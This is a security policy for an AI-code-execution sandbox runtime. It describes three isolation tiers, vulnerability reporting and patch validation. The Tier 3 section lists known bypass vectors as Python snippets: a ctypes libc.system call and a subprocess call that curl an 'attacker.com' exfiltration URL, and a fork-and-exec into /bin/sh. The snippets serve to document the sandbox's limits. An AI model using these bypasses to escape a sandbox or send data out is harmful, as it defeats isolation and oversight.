# 🔒 Security Policy — Aether AI-Safe Runtime

## 🛡️ Supported Versions

| Component | Version | Security Support |
|:---|:---|:---|
| `ae` CLI toolchain | ≥ 1.0 | ✅ Active |
| Python SDK (`ai_runtime`) | ≥ 1.0 | ✅ Active |
| Node.js SDK (`sdk/node`) | ≥ 1.0 | ✅ Active |

---

## 🚨 Reporting a Vulnerability

> [!IMPORTANT]
> Please **do not** open a public GitHub issue for security vulnerabilities.
> Instead, open a [private security advisory](https://github.com/foxprint666/aether-lang/security/advisories/new) on GitHub.

We aim to triage within **72 hours** and publish a fix within **14 days** for confirmed critical issues.

---

## 🏗️ Sandbox Threat Model

> [!WARNING]
> The AI-Safe Runtime uses a three-tier sandbox design. Each tier has a precisely defined isolation boundary. **Understanding these boundaries is essential before deploying the runtime in a production context.**

### Tier 1 — Cranelift JIT (`t1_cranelift`)

| Property | Value |
|:---|:---|
| `isolation_level` | `"cranelift_jit"` |
| Payload language | Aether (`.ae`) only |
| Memory isolation | **None** — JIT runs in-process |
| Syscall isolation | **None** |
| When safe | Trusted, compiler-verified Aether source only |

> [!CAUTION]
> T1 compiles `.ae` source to native machine code via Cranelift and executes it within the host Python process. The FFI guard ring (`ae_sandbox_execute` in `ffi.rs`) uses `std::panic::catch_unwind` to prevent Rust panics from unwinding into Python, but **provides zero OS-level isolation**. An adversarial Aether payload could read or write the host process's memory.
> 
> **T1 is intended for internal agent use on compiler-verified, `stable`-typed Aether programs only.** Do not execute user-supplied arbitrary code with T1.

---

### Tier 2 — Wasmtime WASI (`t2_wasm`)

| Property | Value |
|:---|:---|
| `isolation_level` | `"wasm_sandbox"` |
| Payload language | Python 3.x (via `python.wasm`) |
| Memory isolation | ✅ Hardware WebAssembly linear memory boundary |
| Syscall isolation | ✅ WASI capability model (network/FS blocked by default) |
| When safe | Untrusted Python code with moderate risk tolerance |

> [!NOTE]
> T2 executes payloads inside a Wasmtime WASI sandbox. The WebAssembly memory model enforces a hard hardware boundary — code running inside the WASM instance cannot access host process memory. Network and filesystem access are controlled by WASI capability grants (both disabled by default).

**Known limitations:**
- `python.wasm` build is a single-threaded interpreter; CPU-intensive loops can still cause high host CPU load (mitigated by epoch-based timeout interruption).
- Side-channel attacks (timing, cache) are not mitigated.

---

### Tier 3 — Subprocess + Audit Hook (`t3_subprocess`)

| Property | Value |
|:---|:---|
| `isolation_level` | `"audit_hook"` |
| Payload language | Python 3.x |
| Memory isolation | ✅ OS process boundary |
| Syscall isolation | ⚠️ **Partial** — `sys.addaudithook` only |
| When safe | Development / CI / low-risk automation on trusted machines |

> [!NOTE]
> T3 spawns the payload in a child Python process. The OS process boundary prevents direct memory access to the parent. Network and filesystem writes are intercepted via `sys.addaudithook`.

#### ⚠️ Known Bypass Vectors (T3)

> [!CAUTION]
> `sys.addaudithook` operates at the CPython layer, **not the OS syscall layer**. Adversarial code can bypass it using the following methods.

```python
# Direct ctypes syscall — bypasses audit hook entirely
import ctypes
libc = ctypes.CDLL(None)
libc.system(b"curl http://attacker.com/exfil")
```

```python
# Indirect import
__import__('subprocess').run(['curl', 'http://attacker.com'])
```

```python
# os.fork + exec (POSIX only)
import os
if os.fork() == 0:
    os.execv('/bin/sh', ['/bin/sh', '-c', 'curl ...'])
```

> [!WARNING]
> These bypass vectors are **documented and accepted limitations** of T3.

**T3 is appropriate for:**
- Local development sandboxing where the payload author is trusted
- CI pipelines executing known-safe agent-generated patches
- Environments where the host machine is already considered inside the trust boundary

**T3 is NOT appropriate for:**
- Executing arbitrary, user-supplied code from untrusted sources
- Production multi-tenant deployments

> [!TIP]
> For stronger isolation, use T2 (Wasmtime) or deploy inside a container with seccomp filters applied at the Docker/OCI level.

---

## ✅ Patch Validation

All patches pass through a three-gate validation pipeline before execution:

| Gate | What it checks |
|:---|:---|
| **Gate 1 — JSON Schema** | Structural correctness, required fields, type constraints |
| **Gate 2 — Security Rules** | Sensitive path patterns, blocked operation types, payload size limits |
| **Gate 3 — Aether Sema** | (Optional) ContentHash resolution, stability level, type compatibility |

Gate 3 is only applied when the patch carries an `ae_target` block. Patches without `ae_target` are executed as text/AST patches under Gates 1 and 2 only.

---

## 📦 Supply Chain

- All Rust crates are pinned in `Cargo.lock`.
- The Python SDK has no mandatory runtime dependencies beyond the standard library (optional: `wasmtime`, `libcst`).
- `python.wasm` is fetched at first T2 use from a pinned GitHub release URL verified against a SHA-256 digest stored in `sdk/python/ai_runtime/wasm_runtime/MANIFEST.json`.

---

## 🔍 Dependency Vulnerabilities

Run `cargo audit` (Rust) and `pip-audit` (Python) to check for known CVEs in dependencies. These are run in CI on every PR.
